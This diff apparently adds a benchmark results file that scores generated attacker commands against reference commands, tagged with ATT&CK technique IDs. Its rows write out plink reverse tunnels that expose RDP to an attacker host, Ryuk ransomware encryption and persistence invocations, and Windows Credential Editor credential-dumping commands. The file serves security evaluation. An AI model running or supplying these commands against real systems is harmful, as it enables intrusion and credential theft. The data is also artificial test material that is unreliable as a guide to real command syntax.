@@ -1,0 +1,26 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_plink_TA0011_T1071.txt,plink,plink.exe -share <session_name>,`plink.exe <domain_admin>@<bankfileserver_ip>`,31.53,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -C -i <private_key_file> -hostkey <host_key_id> <attacker_ssh_user>@<remote_host>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",36.165,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -sshlog <log_file> -sshrawlog <log_file> -share,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",22.427,True
+command_plink_TA0011_T1071.txt,plink,cvs -d :ext:<session_name>:/<path_to_repository> co <module>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",13.318,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -noshare -sshlog <log_file> -sshrawlog <log_file> -R 53:localhost:53,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",28.936,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -noagent -i <private_key_file> -hostkey <host_key_id> <attacker_ssh_user>@<remote_host>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",34.418,True
+command_ryuk_TA0003_T1505.txt,ryuk,ryuk.exe --web-shell <web_shell_path>,`ryuk.exe --encrypt --process-name notepad.exe`,26.667,True
+command_ryuk_TA0003_T1505.txt,ryuk,ryuk.exe --http-server <http_server_port>,`ryuk.exe --encrypt --process-name notepad.exe`,26.084,True
+command_ryuk_TA0003_T1505.txt,ryuk,ryuk.exe --ssh-tunnel <ssh_tunnel_port>,`ryuk.exe --encrypt --process-name notepad.exe`,26.8,True
+command_ryuk_TA0003_T1505.txt,ryuk,ryuk.exe -- persistence <persistence_script_path>,`ryuk.exe --encrypt --process-name notepad.exe`,28.709,True
+command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -g <password>,"```sh
+wce.exe -w
+```",11.21,True
+command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -K,"```sh
+wce.exe -w
+```",23.998,True
+command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -k <file_path>,"```sh
+wce.exe -w
+```",10.636,True
+command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
+wce.exe -w
+```",33.601,True
+command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -f,"```sh
+wce.exe -w
+```",23.998,True
